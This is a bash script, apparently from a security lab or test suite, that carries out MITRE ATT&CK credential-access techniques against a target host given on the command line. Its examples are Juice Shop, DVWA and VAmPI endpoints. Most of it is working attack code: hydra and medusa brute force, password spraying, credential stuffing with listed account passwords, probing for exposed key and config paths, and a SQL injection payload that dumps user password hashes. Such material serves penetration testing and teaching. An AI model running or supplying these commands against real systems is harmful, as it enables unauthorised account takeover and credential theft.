#!/bin/bash
# MITRE ATT&CK: Credential Access (TA0006)
# Techniques: T1110 Brute Force, T1212 Exploitation for Credential Access,
#             T1552 Unsecured Credentials, T1539 Steal Web Session Cookie
# Tools: hydra, medusa, ncrack, sqlmap, curl, john, hashcat
set -uo pipefail

TARGET="${1:?Usage: 04-credential-access.sh <TARGET_FQDN>}"
BASE="${TARGET_PROTOCOL:-http}://${TARGET}"

echo "[*] MITRE ATT&CK TA0006: Credential Access against ${TARGET}"
echo ""

echo "=== T1110.001: Brute Force — Password Guessing ==="
echo "    Technique: Automated password guessing against login endpoints"

echo "  [T1110.001.a] Hydra against Juice Shop REST API:"
echo "admin@juice-sh.op" >/tmp/mitre-users-$$.txt
hydra -L /tmp/mitre-users-$$.txt \
  -P /opt/seclists/Passwords/Common-Credentials/best15.txt \
  "$TARGET" http-post-form \
  "/juice-shop/rest/user/login:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Invalid:H=Content-Type\: application/json" \
  -t 4 -f -I 2>&1 | grep -E "(login:|valid|host:|Hydra)" | head -5
echo ""

echo "  [T1110.001.b] Medusa against DVWA:"
medusa -h "$TARGET" -u admin -P /opt/seclists/Passwords/Common-Credentials/best15.txt \
  -M http -m "DIR:/dvwa/login.php" -n 80 -t 4 -f 2>&1 | grep -iE "(success|found|account)" | head -5
echo ""

echo "=== T1110.003: Brute Force — Password Spraying ==="
echo "    Technique: One password against many usernames"
SPRAY_PASS="admin123"
echo "  Spraying '${SPRAY_PASS}' against known Juice Shop accounts:"
for user in "admin@juice-sh.op" "jim@juice-sh.op" "bender@juice-sh.op" "mc.safesearch@juice-sh.op" "ciso@juice-sh.op"; do
  code=$(curl -sf -o /dev/null -w "%{http_code}" -X POST "${BASE}/juice-shop/rest/user/login" \
    -H "Content-Type: application/json" -d "{\"email\":\"${user}\",\"password\":\"${SPRAY_PASS}\"}" --max-time 10) || code="ERR"
  tag="[SAFE]"
  [[ "$code" == "200" ]] && tag="[VULN]"
  printf "  %s %s -> HTTP %s\n" "$tag" "$user" "$code"
done
echo ""

echo "=== T1110.004: Brute Force — Credential Stuffing ==="
echo "    Technique: Testing leaked credential pairs"
CRED_PAIRS=(
  "admin@juice-sh.op:admin123"
  "jim@juice-sh.op:ncc-1701"
  "bender@juice-sh.op:OhG0dPlease1nsique"
  "mc.safesearch@juice-sh.op:Mr. N00dles"
  "admin@juice-sh.op:password"
)
for pair in "${CRED_PAIRS[@]}"; do
  user="${pair%%:*}"
  pass="${pair##*:}"
  code=$(curl -sf -o /dev/null -w "%{http_code}" -X POST "${BASE}/juice-shop/rest/user/login" \
    -H "Content-Type: application/json" -d "{\"email\":\"${user}\",\"password\":\"${pass}\"}" --max-time 10) || code="ERR"
  tag="[SAFE]"
  [[ "$code" == "200" ]] && tag="[VULN]"
  printf "  %s %s:%s -> HTTP %s\n" "$tag" "$user" "$pass" "$code"
done
echo ""

echo "=== T1552.001: Unsecured Credentials — In Files ==="
echo "    Technique: Sensitive data in exposed files"
for path in "/juice-shop/ftp/" "/juice-shop/encryptionkeys/" "/juice-shop/robots.txt" "/juice-shop/.well-known/security.txt" "/juice-shop/api-docs/" "/vampi/openapi.json" "/vampi/console"; do
  code=$(curl -sf -o /dev/null -w "%{http_code}" "${BASE}${path}" --max-time 10) || code="ERR"
  tag="[INFO]"
  [[ "$code" == "200" ]] && tag="[VULN]"
  printf "  %s %s -> HTTP %s\n" "$tag" "$path" "$code"
done
echo ""

echo "=== T1212: Exploitation for Credential Access ==="
echo "    Technique: SQLi to extract password hashes"
resp=$(curl -sf "${BASE}/juice-shop/rest/products/search?q=test'))UNION+SELECT+id,email,password,'4','5','6','7','8','9'+FROM+Users--" --max-time 10 2>/dev/null)
if echo "$resp" | grep -qiE "(\\\$2[aby]|md5|[a-f0-9]{32})" 2>/dev/null; then
  echo "  [VULN] T1212 Password hashes extracted via UNION SELECT"
  echo "$resp" | jq -r '.data[]? | "\(.email // .id): \(.password // "N/A")"' 2>/dev/null | head -5
else
  printf '  [INFO] T1212 UNION SELECT attempted (response: %sB)\n' "${#resp}"
fi
echo ""

echo "=== T1539: Steal Web Session Cookie ==="
echo "    Technique: Session fixation and cookie analysis"
echo "  DVWA session cookie analysis:"
curl -sf -v "${BASE}/dvwa/login.php" 2>&1 | grep -i "set-cookie" | head -3
echo ""
echo "  Cookie security flags check:"
curl -sf -I "${BASE}/dvwa/login.php" 2>/dev/null | grep -i "set-cookie" | while read -r line; do
  echo "    $line"
  echo "$line" | grep -qi "httponly" || echo "    [VULN] Missing HttpOnly flag"
  echo "$line" | grep -qi "secure" || echo "    [VULN] Missing Secure flag"
  echo "$line" | grep -qi "samesite" || echo "    [VULN] Missing SameSite flag"
done

rm -f /tmp/mitre-users-$$.txt
echo ""
echo "[*] TA0006 Credential Access complete"
